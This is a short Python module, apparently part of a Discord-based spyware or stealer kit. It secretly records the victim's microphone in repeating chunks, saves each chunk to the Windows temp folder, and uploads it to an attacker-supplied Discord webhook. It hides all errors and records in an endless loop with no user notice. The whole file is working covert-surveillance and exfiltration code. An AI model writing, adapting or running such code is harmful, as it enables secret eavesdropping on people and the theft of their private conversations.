import pyaudio
import wave
from discord import SyncWebhook, File
import os


#RECORD_LEN = 120
#FILE = "mic.wav"
#
#FORMAT = pyaudio.paInt16
#CHANNELS = 1
#RATE = 44100
#CHUNK = 1024


class RecordMic:
    def __init__(self, record_len=0, webhook=""):
        self.webhook = webhook
        self.record_len = record_len

        if self.record_len > 0:
            self.recording = True
            self.audio = pyaudio.PyAudio()
            self.stream = self.audio.open(format=pyaudio.paInt16, channels=1, rate=44100, input=True, frames_per_buffer=1024)
            self.record()
        else:
            self.recording = False


    def record(self):
        frames = []
        for i in range(0, int(44100 / 1024 * self.record_len)):
            data = self.stream.read(1024)
            frames.append(data)

        file = f"{os.getenv('temp')}\\rec.wav"
        #file = f"{datetime.datetime.now()}-mic.wav".replace(" ", "-").replace(":", "_").replace(".", "_", 1)
        with wave.open(file, "wb") as f:
            f.setnchannels(1)
            f.setsampwidth(self.audio.get_sample_size(pyaudio.paInt16))
            f.setframerate(44100)
            f.writeframes(b"".join(frames))

        self.send(file)
        if self.recording:
            self.record()
        else:
            self.stream.stop_stream()
            self.stream.close()
            self.audio.terminate()
    
    def send(self, file):
        try:
            webhook = SyncWebhook.from_url(self.webhook)
            webhook.send(file=File(file))
        except:
            pass

    #def stop(self):
    #    self.recording = False


#RecordMic(120, "https://discord.com/api/webhooks/ID/TOKEN")
#RecordMic().stop()
